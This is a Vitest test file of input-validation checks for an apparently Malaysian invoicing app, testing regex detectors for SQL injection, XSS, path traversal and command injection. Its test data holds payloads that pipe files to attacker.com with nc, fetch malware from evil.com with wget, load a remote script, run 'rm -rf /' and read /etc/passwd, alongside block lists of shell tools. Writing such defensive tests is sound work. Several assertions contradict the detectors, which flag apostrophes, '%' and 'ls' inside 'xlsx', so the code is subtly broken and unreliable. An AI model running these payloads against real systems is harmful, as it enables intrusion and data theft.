import { describe, it, expect } from 'vitest';

describe('Data Validation Security Tests', () => {
  // SQL Injection Detection
  const detectSqlInjection = (input: string): boolean => {
    const sqlPatterns = [
      /('|(\\\')|(\-\-)|(\;)|(\||OR|AND)|(\*|\%)){1,}/gi,
      /(\bunion\b|\bselect\b|\binsert\b|\bdelete\b|\bdrop\b|\bcreate\b|\balter\b|\bexec\b|\bexecute\b)/gi,
      /(\bscript\b|\bjavascript\b|\bvbscript\b|\bonload\b|\bonerror\b)/gi,
    ];
    
    return sqlPatterns.some(pattern => pattern.test(input));
  };

  // XSS Detection
  const detectXss = (input: string): boolean => {
    const xssPatterns = [
      /<script[^>]*>.*?<\/script\b[^>]*>/gi,
      /<iframe[^>]*>.*?<\/iframe>/gi,
      /javascript:/gi,
      /on\w+\s*=/gi,
      /<img[^>]+src[^>]*=[\s]*[\'\"]*javascript:/gi,
      /<[^>]*(\bon\w+\s*=|\bjavascript:|\bdata:)/gi,
    ];
    
    return xssPatterns.some(pattern => pattern.test(input));
  };

  // Path Traversal Detection
  const detectPathTraversal = (input: string): boolean => {
    const pathTraversalPatterns = [
      /\.\./g,
      /\.\\\./g,
      /%2e%2e/gi,
      /%252e%252e/gi,
      /\.%2e/gi,
      /%2e\./gi,
    ];
    
    return pathTraversalPatterns.some(pattern => pattern.test(input));
  };

  // Command Injection Detection
  const detectCommandInjection = (input: string): boolean => {
    const commandPatterns = [
      /(\||;|&|`|\$\(|\${)/g,
      /(ls|cat|grep|find|rm|mv|cp|chmod|chown|ps|kill|wget|curl)/gi,
      /(exec|system|shell_exec|passthru|eval)/gi,
    ];
    
    return commandPatterns.some(pattern => pattern.test(input));
  };

  // LDAP Injection Detection
  const detectLdapInjection = (input: string): boolean => {
    const ldapPatterns = [
      /(\*|\(|\)|\||&|!)/g,
      /(objectClass|cn|uid|ou|dc)/gi,
    ];
    
    return ldapPatterns.some(pattern => pattern.test(input));
  };

  describe('SQL Injection Prevention', () => {
    it('should detect SQL injection attempts in invoice data', () => {
      const maliciousInputs = [
        "'; DROP TABLE invoices; --",
        "' OR '1'='1",
        "1' UNION SELECT * FROM users --",
        "'; INSERT INTO invoices VALUES ('malicious'); --",
        "' OR 1=1 --",
        "admin'/*",
        "' OR 'a'='a",
        "x' AND email IS NULL; --",
        "'; UPDATE invoices SET amount=0; --",
        "' UNION SELECT creditCardNumber FROM payments --",
      ];

      maliciousInputs.forEach(input => {
        const isDetected = detectSqlInjection(input);
        expect(isDetected).toBe(true);
      });
    });

    it('should allow legitimate invoice data', () => {
      const legitimateInputs = [
        "Professional Services",
        "O'Reilly Books",
        "Smith & Sons Consulting",
        "50% Discount Applied",
        "Invoice #INV-2024-001",
        "Email: contact@company.com",
        "Phone: +60123456789",
        "Address: 123 Main St., Kuala Lumpur",
      ];

      legitimateInputs.forEach(input => {
        const isDetected = detectSqlInjection(input);
        expect(isDetected).toBe(false);
      });
    });

    it('should handle Malaysian-specific business data safely', () => {
      const malaysianData = [
        "Syarikat ABC Sdn Bhd",
        "No. 123, Jalan Ampang, Kuala Lumpur",
        "TIN: C1234567890",
        "SST No: B16-1234-56789012",
        "Perkhidmatan Perundingan IT",
        "Cukai Jualan & Perkhidmatan 6%",
      ];

      malaysianData.forEach(input => {
        const isDetected = detectSqlInjection(input);
        expect(isDetected).toBe(false);
      });
    });
  });

  describe('XSS Prevention', () => {
    it('should detect XSS attempts in user input', () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<svg onload="alert(1)">',
        '<input type="image" src="x" onerror="alert(1)">',
        '<body onload="alert(1)">',
        'javascript:alert(1)',
        '<script src="http://evil.com/xss.js"></script>',
        '<div onclick="alert(1)">Click me</div>',
        '<a href="javascript:alert(1)">Link</a>',
      ];

      xssPayloads.forEach(payload => {
        const isDetected = detectXss(payload);
        expect(isDetected).toBe(true);
      });
    });

    it('should allow safe HTML-like content in descriptions', () => {
      const safeContent = [
        "Price: $100 < $200",
        "Quantity: 5 units",
        "Description: <Professional> Services",
        "Email format: user@domain.com",
        "Formula: A + B = C",
        "File: document.pdf",
        "URL: https://company.com",
      ];

      safeContent.forEach(content => {
        const isDetected = detectXss(content);
        expect(isDetected).toBe(false);
      });
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should detect path traversal attempts in file operations', () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        'file://../../etc/passwd',
        '....//....//....//etc/passwd',
        '/var/www/../../etc/passwd',
        'C:\\..\\..\\..\\windows\\system32\\',
      ];

      pathTraversalAttempts.forEach(attempt => {
        const isDetected = detectPathTraversal(attempt);
        expect(isDetected).toBe(true);
      });
    });

    it('should allow legitimate file paths', () => {
      const legitimatePaths = [
        'invoice-2024-001.pdf',
        'exports/invoices.csv',
        'uploads/logo.png',
        'documents/report.xlsx',
        'templates/standard-invoice.json',
      ];

      legitimatePaths.forEach(path => {
        const isDetected = detectPathTraversal(path);
        expect(isDetected).toBe(false);
      });
    });
  });

  describe('Command Injection Prevention', () => {
    it('should detect command injection attempts', () => {
      const commandInjectionAttempts = [
        'file.pdf; rm -rf /',
        'invoice.csv && cat /etc/passwd',
        'export.json | nc attacker.com 4444',
        'report.xlsx `whoami`',
        'data.csv $(rm important.file)',
        'file.pdf; wget http://evil.com/malware',
        'invoice.json & curl http://attacker.com/',
      ];

      commandInjectionAttempts.forEach(attempt => {
        const isDetected = detectCommandInjection(attempt);
        expect(isDetected).toBe(true);
      });
    });

    it('should allow normal file operations', () => {
      const normalFileOps = [
        'invoice-2024-001.pdf',
        'monthly-report.xlsx',
        'customer-data.csv',
        'company-logo.png',
        'template-standard.json',
      ];

      normalFileOps.forEach(filename => {
        const isDetected = detectCommandInjection(filename);
        expect(isDetected).toBe(false);
      });
    });
  });

  describe('Input Sanitization', () => {
    it('should sanitize user input properly', () => {
      const sanitizeInput = (input: string): string => {
        return input
          .replace(/[<>&'"]/g, (match) => {
            const entityMap: { [key: string]: string } = {
              '<': '&lt;',
              '>': '&gt;',
              '&': '&amp;',
              "'": '&#x27;',
              '"': '&quot;'
            };
            return entityMap[match];
          })
          .trim()
          .substring(0, 1000); // Limit length
      };

      const testInputs = [
        { input: '<script>alert("xss")</script>', expected: '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;' },
        { input: 'Company & Associates', expected: 'Company &amp; Associates' },
        { input: "O'Reilly Books", expected: 'O&#x27;Reilly Books' },
        { input: 'Product "Professional"', expected: 'Product &quot;Professional&quot;' },
      ];

      testInputs.forEach(({ input, expected }) => {
        const sanitized = sanitizeInput(input);
        expect(sanitized).toBe(expected);
      });
    });

    it('should validate and normalize Malaysian TIN format', () => {
      const validateMalaysianTin = (tin: string): { valid: boolean; normalized?: string; errors: string[] } => {
        const errors: string[] = [];
        
        // Remove whitespace and convert to uppercase
        const cleaned = tin.replace(/\s/g, '').toUpperCase();
        
        // Check for malicious content
        if (detectSqlInjection(cleaned) || detectXss(cleaned)) {
          errors.push('Invalid characters detected');
          return { valid: false, errors };
        }
        
        // Validate format
        const patterns = {
          corporate: /^C\d{10}$/,
          individual: /^\d{12}$/,
          government: /^G\d{10}$/,
          nonprofit: /^N\d{10}$/
        };
        
        const isValid = Object.values(patterns).some(pattern => pattern.test(cleaned));
        
        if (!isValid) {
          errors.push('Invalid TIN format');
        }
        
        return {
          valid: isValid,
          normalized: isValid ? cleaned : undefined,
          errors
        };
      };

      const testCases = [
        { input: 'C1234567890', expectedValid: true },
        { input: 'c1234567890', expectedValid: true }, // Should normalize to uppercase
        { input: '123456789012', expectedValid: true },
        { input: 'G1234567890', expectedValid: true },
        { input: 'N1234567890', expectedValid: true },
        { input: 'INVALID123', expectedValid: false },
        { input: "C1234567890'; DROP TABLE--", expectedValid: false },
        { input: 'C1234567890<script>', expectedValid: false },
      ];

      testCases.forEach(({ input, expectedValid }) => {
        const result = validateMalaysianTin(input);
        expect(result.valid).toBe(expectedValid);
        
        if (expectedValid && result.valid) {
          expect(result.normalized).toBeDefined();
          expect(result.normalized?.toUpperCase()).toBe(result.normalized);
        }
      });
    });

    it('should validate monetary amounts securely', () => {
      const validateAmount = (amount: string): { valid: boolean; normalized?: number; errors: string[] } => {
        const errors: string[] = [];
        
        // Check for malicious content
        if (detectSqlInjection(amount) || detectXss(amount) || detectCommandInjection(amount)) {
          errors.push('Invalid characters in amount');
          return { valid: false, errors };
        }
        
        // Remove whitespace and currency symbols
        const cleaned = amount.replace(/[\s$,]/g, '');
        
        // Validate format
        const amountPattern = /^\d+(\.\d{1,2})?$/;
        if (!amountPattern.test(cleaned)) {
          errors.push('Invalid amount format');
          return { valid: false, errors };
        }
        
        const numericValue = parseFloat(cleaned);
        
        // Validate range
        if (isNaN(numericValue) || !isFinite(numericValue)) {
          errors.push('Amount must be a valid number');
          return { valid: false, errors };
        }
        
        if (numericValue < 0) {
          errors.push('Amount cannot be negative');
          return { valid: false, errors };
        }
        
        if (numericValue > 999999999.99) {
          errors.push('Amount exceeds maximum limit');
          return { valid: false, errors };
        }
        
        return {
          valid: true,
          normalized: Math.round(numericValue * 100) / 100,
          errors: []
        };
      };

      const testAmounts = [
        { input: '1000.00', expectedValid: true, expectedValue: 1000.00 },
        { input: '$1,234.56', expectedValid: true, expectedValue: 1234.56 },
        { input: '0.01', expectedValid: true, expectedValue: 0.01 },
        { input: 'NaN', expectedValid: false },
        { input: 'Infinity', expectedValid: false },
        { input: '-100.00', expectedValid: false },
        { input: "1000.00'; DROP TABLE--", expectedValid: false },
        { input: '1000.00<script>', expectedValid: false },
        { input: '1000000000.00', expectedValid: false }, // Too large
      ];

      testAmounts.forEach(({ input, expectedValid, expectedValue }) => {
        const result = validateAmount(input);
        expect(result.valid).toBe(expectedValid);
        
        if (expectedValid && expectedValue !== undefined) {
          expect(result.normalized).toBe(expectedValue);
        }
      });
    });
  });

  describe('File Upload Security', () => {
    it('should validate file types securely', () => {
      const validateFileType = (filename: string, allowedTypes: string[]): { valid: boolean; errors: string[] } => {
        const errors: string[] = [];
        
        // Check for path traversal
        if (detectPathTraversal(filename)) {
          errors.push('Invalid file path');
          return { valid: false, errors };
        }
        
        // Check for malicious extensions
        const maliciousExtensions = [
          '.exe', '.bat', '.cmd', '.com', '.pif', '.scr', '.vbs', '.js',
          '.jar', '.php', '.asp', '.aspx', '.jsp', '.py', '.pl', '.sh'
        ];
        
        const extension = filename.toLowerCase().split('.').pop();
        if (!extension) {
          errors.push('File must have an extension');
          return { valid: false, errors };
        }
        
        if (maliciousExtensions.includes(`.${extension}`)) {
          errors.push('File type not allowed for security reasons');
          return { valid: false, errors };
        }
        
        if (!allowedTypes.includes(extension)) {
          errors.push(`File type .${extension} not allowed`);
          return { valid: false, errors };
        }
        
        return { valid: true, errors: [] };
      };

      const allowedTypes = ['csv', 'xlsx', 'pdf', 'png', 'jpg', 'jpeg'];
      
      const testFiles = [
        { filename: 'invoices.csv', expectedValid: true },
        { filename: 'report.xlsx', expectedValid: true },
        { filename: 'document.pdf', expectedValid: true },
        { filename: 'logo.png', expectedValid: true },
        { filename: 'malware.exe', expectedValid: false },
        { filename: 'script.js', expectedValid: false },
        { filename: '../../../etc/passwd', expectedValid: false },
        { filename: 'file.txt', expectedValid: false }, // Not in allowed types
      ];

      testFiles.forEach(({ filename, expectedValid }) => {
        const result = validateFileType(filename, allowedTypes);
        expect(result.valid).toBe(expectedValid);
      });
    });

    it('should validate file size limits', () => {
      const validateFileSize = (size: number, maxSize: number): { valid: boolean; errors: string[] } => {
        const errors: string[] = [];
        
        if (size <= 0) {
          errors.push('File cannot be empty');
          return { valid: false, errors };
        }
        
        if (size > maxSize) {
          errors.push(`File size ${size} bytes exceeds maximum of ${maxSize} bytes`);
          return { valid: false, errors };
        }
        
        return { valid: true, errors: [] };
      };

      const maxSizes = {
        csv: 10 * 1024 * 1024,    // 10MB for CSV
        pdf: 25 * 1024 * 1024,    // 25MB for PDF
        image: 5 * 1024 * 1024,   // 5MB for images
      };

      const testSizes = [
        { size: 1024, maxSize: maxSizes.csv, expectedValid: true },
        { size: maxSizes.csv - 1, maxSize: maxSizes.csv, expectedValid: true },
        { size: maxSizes.csv + 1, maxSize: maxSizes.csv, expectedValid: false },
        { size: 0, maxSize: maxSizes.csv, expectedValid: false },
        { size: -1, maxSize: maxSizes.csv, expectedValid: false },
      ];

      testSizes.forEach(({ size, maxSize, expectedValid }) => {
        const result = validateFileSize(size, maxSize);
        expect(result.valid).toBe(expectedValid);
      });
    });
  });

  describe('API Parameter Validation', () => {
    it('should validate pagination parameters', () => {
      const validatePagination = (page: string, limit: string): { valid: boolean; errors: string[] } => {
        const errors: string[] = [];
        
        // Check for injection attempts
        if (detectSqlInjection(page) || detectSqlInjection(limit)) {
          errors.push('Invalid characters in pagination parameters');
          return { valid: false, errors };
        }
        
        const pageNum = parseInt(page);
        const limitNum = parseInt(limit);
        
        if (isNaN(pageNum) || pageNum < 1 || pageNum > 10000) {
          errors.push('Invalid page number');
        }
        
        if (isNaN(limitNum) || limitNum < 1 || limitNum > 1000) {
          errors.push('Invalid limit value');
        }
        
        return { valid: errors.length === 0, errors };
      };

      const testParams = [
        { page: '1', limit: '20', expectedValid: true },
        { page: '100', limit: '50', expectedValid: true },
        { page: '0', limit: '20', expectedValid: false },
        { page: '-1', limit: '20', expectedValid: false },
        { page: '1', limit: '0', expectedValid: false },
        { page: '1', limit: '1001', expectedValid: false },
        { page: "1'; DROP TABLE--", limit: '20', expectedValid: false },
        { page: 'abc', limit: '20', expectedValid: false },
      ];

      testParams.forEach(({ page, limit, expectedValid }) => {
        const result = validatePagination(page, limit);
        expect(result.valid).toBe(expectedValid);
      });
    });

    it('should validate date range parameters', () => {
      const validateDateRange = (startDate: string, endDate: string): { valid: boolean; errors: string[] } => {
        const errors: string[] = [];
        
        // Check for injection attempts
        if (detectSqlInjection(startDate) || detectSqlInjection(endDate)) {
          errors.push('Invalid characters in date parameters');
          return { valid: false, errors };
        }
        
        const datePattern = /^\d{4}-\d{2}-\d{2}$/;
        
        if (!datePattern.test(startDate)) {
          errors.push('Invalid start date format');
        }
        
        if (!datePattern.test(endDate)) {
          errors.push('Invalid end date format');
        }
        
        if (errors.length === 0) {
          const start = new Date(startDate);
          const end = new Date(endDate);
          
          if (isNaN(start.getTime()) || isNaN(end.getTime())) {
            errors.push('Invalid date values');
          } else if (start > end) {
            errors.push('Start date must be before end date');
          } else if (end > new Date()) {
            errors.push('End date cannot be in the future');
          }
        }
        
        return { valid: errors.length === 0, errors };
      };

      const testDateRanges = [
        { start: '2024-01-01', end: '2024-01-31', expectedValid: true },
        { start: '2024-01-31', end: '2024-01-01', expectedValid: false },
        { start: '2024-13-01', end: '2024-01-31', expectedValid: false },
        { start: 'invalid', end: '2024-01-31', expectedValid: false },
        { start: "2024-01-01'; DROP--", end: '2024-01-31', expectedValid: false },
      ];

      testDateRanges.forEach(({ start, end, expectedValid }) => {
        const result = validateDateRange(start, end);
        expect(result.valid).toBe(expectedValid);
      });
    });
  });
});